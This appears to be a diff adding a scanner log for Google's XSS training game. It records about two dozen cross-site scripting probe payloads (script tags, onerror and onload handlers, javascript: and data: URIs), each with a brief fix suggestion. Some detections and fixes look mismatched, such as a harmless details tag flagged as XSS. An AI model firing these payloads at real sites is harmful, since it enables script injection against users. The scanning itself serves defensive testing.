@@ -1,0 +1,54 @@
+2025-02-28 19:59:19 - INFO - Scanning https://xss-game.appspot.com/level1/frame for XSS vulnerabilities.
+2025-02-28 19:59:50 - WARNING - [XSS] Vulnerability detected at https://xss-game.appspot.com/level1/frame?query=<script>alert('XSS')</script>
+2025-02-28 19:59:50 - INFO - Solution for HTML Injection: Use HTML escaping for user inputs.
+2025-02-28 20:27:51 - INFO - Scanning https://xss-game.appspot.com/level1/frame for XSS vulnerabilities.
+2025-02-28 20:28:22 - WARNING - [XSS] Vulnerability detected at https://xss-game.appspot.com/level1/frame?query=<script>alert('XSS')</script>
+2025-02-28 20:28:22 - INFO - Solution for HTML Injection: Use HTML escaping for user inputs.
+2025-02-28 20:28:22 - WARNING - [XSS] Vulnerability detected at https://xss-game.appspot.com/level1/frame?query=<img src="javascript:alert('XSS')">
+2025-02-28 20:28:22 - INFO - Solution for JavaScript URI Injection: Avoid using javascript: in href attributes.
+2025-02-28 20:28:22 - WARNING - [XSS] Vulnerability detected at https://xss-game.appspot.com/level1/frame?query=<div onmouseover="alert('XSS')"></div>
+2025-02-28 20:28:22 - INFO - Solution for Inline Event Handler: Avoid using inline event handlers like onmouseover.
+2025-02-28 20:28:22 - WARNING - [XSS] Vulnerability detected at https://xss-game.appspot.com/level1/frame?query=<iframe src="javascript:alert('XSS')"></iframe>
+2025-02-28 20:28:22 - INFO - Solution for JavaScript URI Injection: Avoid using javascript: in href attributes.
+2025-02-28 20:28:23 - WARNING - [XSS] Vulnerability detected at https://xss-game.appspot.com/level1/frame?query=<svg/onload=alert('XSS')>
+2025-02-28 20:28:23 - INFO - Solution for SVG Injection: Sanitize SVG content and avoid onload attributes.
+2025-02-28 20:28:23 - WARNING - [XSS] Vulnerability detected at https://xss-game.appspot.com/level1/frame?query=<a href="javascript:alert('XSS')">Click me</a>
+2025-02-28 20:28:23 - INFO - Solution for JavaScript URI Injection: Avoid using javascript: in href attributes.
+2025-02-28 20:28:23 - WARNING - [XSS] Vulnerability detected at https://xss-game.appspot.com/level1/frame?query=<body onload="alert('XSS')">
+2025-02-28 20:28:23 - INFO - Solution for Inline Event Handler: Avoid using inline event handlers like onmouseover.
+2025-02-28 20:28:23 - WARNING - [XSS] Vulnerability detected at https://xss-game.appspot.com/level1/frame?query=<img src="x" onerror="alert('XSS')">
+2025-02-28 20:28:23 - INFO - Solution for Inline Event Handler: Avoid using inline event handlers like onmouseover.
+2025-02-28 20:28:23 - WARNING - [XSS] Vulnerability detected at https://xss-game.appspot.com/level1/frame?query=<a href="javascript:eval('alert(1)')">test</a>
+2025-02-28 20:28:23 - INFO - Solution for JavaScript URI Injection: Avoid using javascript: in href attributes.
+2025-02-28 20:28:24 - WARNING - [XSS] Vulnerability detected at https://xss-game.appspot.com/level1/frame?query=<form action="javascript:alert('XSS')">
+2025-02-28 20:28:24 - INFO - Solution for JavaScript URI Injection: Avoid using javascript: in href attributes.
+2025-02-28 20:28:24 - WARNING - [XSS] Vulnerability detected at https://xss-game.appspot.com/level1/frame?query=<input type="text" value="XSS" onfocus="alert('XSS')">
+2025-02-28 20:28:24 - INFO - Solution for Inline Event Handler: Avoid using inline event handlers like onmouseover.
+2025-02-28 20:28:24 - WARNING - [XSS] Vulnerability detected at https://xss-game.appspot.com/level1/frame?query=<embed src="data:text/html,<script>alert('XSS')</script>">
+2025-02-28 20:28:24 - INFO - Solution for Embedded Script Injection: Use CSP to block unsafe embedded content.
+2025-02-28 20:28:24 - WARNING - [XSS] Vulnerability detected at https://xss-game.appspot.com/level1/frame?query=<video onerror="alert('XSS')">
+2025-02-28 20:28:24 - INFO - Solution for Inline Event Handler: Avoid using inline event handlers like onmouseover.
+2025-02-28 20:28:25 - WARNING - [XSS] Vulnerability detected at https://xss-game.appspot.com/level1/frame?query=<iframe src="javascript:alert('XSS')">
+2025-02-28 20:28:25 - INFO - Solution for JavaScript URI Injection: Avoid using javascript: in href attributes.
+2025-02-28 20:28:25 - WARNING - [XSS] Vulnerability detected at https://xss-game.appspot.com/level1/frame?query=<base href="javascript:alert('XSS')">
+2025-02-28 20:28:25 - INFO - Solution for JavaScript URI Injection: Avoid using javascript: in href attributes.
+2025-02-28 20:28:25 - WARNING - [XSS] Vulnerability detected at https://xss-game.appspot.com/level1/frame?query=<details open><summary>Click me</summary><p>text</p></details>
+2025-02-28 20:28:25 - INFO - Solution for HTML Injection: Use HTML escaping for user inputs.
+2025-02-28 20:28:25 - WARNING - [XSS] Vulnerability detected at https://xss-game.appspot.com/level1/frame?query=<script>document.location='javascript:alert(1)' </script>
+2025-02-28 20:28:25 - INFO - Solution for JavaScript Execution: Avoid using document.location with JavaScript.
+2025-02-28 20:28:25 - WARNING - [XSS] Vulnerability detected at https://xss-game.appspot.com/level1/frame?query=<svg><script>alert('XSS')</script></svg>
+2025-02-28 20:28:25 - INFO - Solution for SVG Injection: Sanitize SVG content and avoid onload attributes.
+2025-02-28 20:28:26 - WARNING - [XSS] Vulnerability detected at https://xss-game.appspot.com/level1/frame?query=<svg/onload=confirm("XSS")>
+2025-02-28 20:28:26 - INFO - Solution for SVG Injection: Sanitize SVG content and avoid onload attributes.
+2025-02-28 20:28:26 - WARNING - [XSS] Vulnerability detected at https://xss-game.appspot.com/level1/frame?query=<iframe src="javascript:alert('XSS')">
+2025-02-28 20:28:26 - INFO - Solution for JavaScript URI Injection: Avoid using javascript: in href attributes.
+2025-02-28 20:28:26 - WARNING - [XSS] Vulnerability detected at https://xss-game.appspot.com/level1/frame?query=<object data="data:text/html,<script>alert('XSS')</script>"></object>
+2025-02-28 20:28:26 - INFO - Solution for Embedded Script Injection: Use CSP to block unsafe embedded content.
+2025-02-28 20:28:26 - WARNING - [XSS] Vulnerability detected at https://xss-game.appspot.com/level1/frame?query="><script>alert('XSS')</script>
+2025-02-28 20:28:26 - INFO - Solution for HTML Injection: Use HTML escaping for user inputs.
+2025-02-28 20:28:27 - WARNING - [XSS] Vulnerability detected at https://xss-game.appspot.com/level1/frame?query=</script><script>alert('XSS')</script>
+2025-02-28 20:28:27 - INFO - Solution for HTML Injection: Use HTML escaping for user inputs.
+2025-02-28 20:28:27 - WARNING - [XSS] Vulnerability detected at https://xss-game.appspot.com/level1/frame?query=<img src=x onerror=alert('XSS')>
+2025-02-28 20:28:27 - INFO - Solution for Inline Event Handler: Avoid using inline event handlers like onmouseover.
+2025-02-28 20:28:28 - WARNING - [XSS] Vulnerability detected at https://xss-game.appspot.com/level1/frame?query=<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>
+2025-02-28 20:28:28 - INFO - Solution for SVG Injection: Sanitize SVG content and avoid onload attributes.
